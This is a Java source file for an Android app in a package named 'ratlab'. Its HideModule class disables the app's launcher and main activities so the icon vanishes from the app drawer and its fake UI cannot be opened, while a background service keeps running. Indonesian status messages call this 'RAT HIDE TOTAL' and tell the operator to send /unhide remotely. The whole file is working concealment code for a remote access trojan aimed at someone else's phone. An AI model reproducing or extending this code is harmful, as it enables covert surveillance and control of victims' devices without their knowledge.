package com.ratlab;

import android.content.ComponentName;
import android.content.Context;
import android.content.pm.PackageManager;

public class HideModule {

    private final Context ctx;

    public HideModule(Context ctx) {
        this.ctx = ctx;
    }

    public String hide() {
        try {
            PackageManager pm = ctx.getPackageManager();

            // Disable SplashActivity — biar ilang dari app drawer
            ComponentName splash = new ComponentName(ctx, SplashActivity.class);
            pm.setComponentEnabledSetting(splash,
                    PackageManager.COMPONENT_ENABLED_STATE_DISABLED,
                    PackageManager.DONT_KILL_APP);

            // Disable MainActivity — biar UI palsu gak bisa dibuka
            ComponentName main = new ComponentName(ctx, MainActivity.class);
            pm.setComponentEnabledSetting(main,
                    PackageManager.COMPONENT_ENABLED_STATE_DISABLED,
                    PackageManager.DONT_KILL_APP);

            return "RAT HIDE TOTAL.\n"
                    + "- Service: Jalan\n"
                    + "- Icon: Gak ada di app drawer\n"
                    + "- UI: Gak bisa dibuka\n\n"
                    + "Kirim /unhide untuk munculin lagi.";
        } catch (Exception e) {
            return "Error hide: " + e.getMessage();
        }
    }

    public String unhide() {
        try {
            PackageManager pm = ctx.getPackageManager();

            ComponentName splash = new ComponentName(ctx, SplashActivity.class);
            pm.setComponentEnabledSetting(splash,
                    PackageManager.COMPONENT_ENABLED_STATE_ENABLED,
                    PackageManager.DONT_KILL_APP);

            ComponentName main = new ComponentName(ctx, MainActivity.class);
            pm.setComponentEnabledSetting(main,
                    PackageManager.COMPONENT_ENABLED_STATE_ENABLED,
                    PackageManager.DONT_KILL_APP);

            return "Icon muncul lagi. Cek app drawer HP kedua.";
        } catch (Exception e) {
            return "Error unhide: " + e.getMessage();
        }
    }
}
